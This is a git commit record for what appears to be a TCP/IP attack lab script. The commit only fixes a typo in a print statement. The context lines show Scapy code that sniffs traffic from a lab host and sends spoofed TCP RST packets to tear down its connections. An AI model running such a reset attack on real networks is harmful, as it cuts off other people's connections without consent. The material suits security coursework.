6a43f83b4918386bce3bda748a2d5a05a5483fbb
Xinyi Li <wolixinyi@gmail.com>
2020-03-25 02:14:17 -0400

    typo

--- TCP-IP-Attack/auto_rst.py
+++ TCP-IP-Attack/auto_rst.py
@@ -6,7 +6,7 @@ def spoof_tcp(pkt):
    tcp = TCP(flags="R", seq=pkt['TCP'].ack,
                   dport=pkt['TCP'].sport, sport=pkt['TCP'].dport)
    spoofpkt = ip / tcp
-   print("send a RST oacket")
+   print("send a RST packet")
    send(spoofpkt, verbose=0)
 
 pkt=sniff(filter='tcp and src host 10.0.2.5', prn=spoof_tcp)
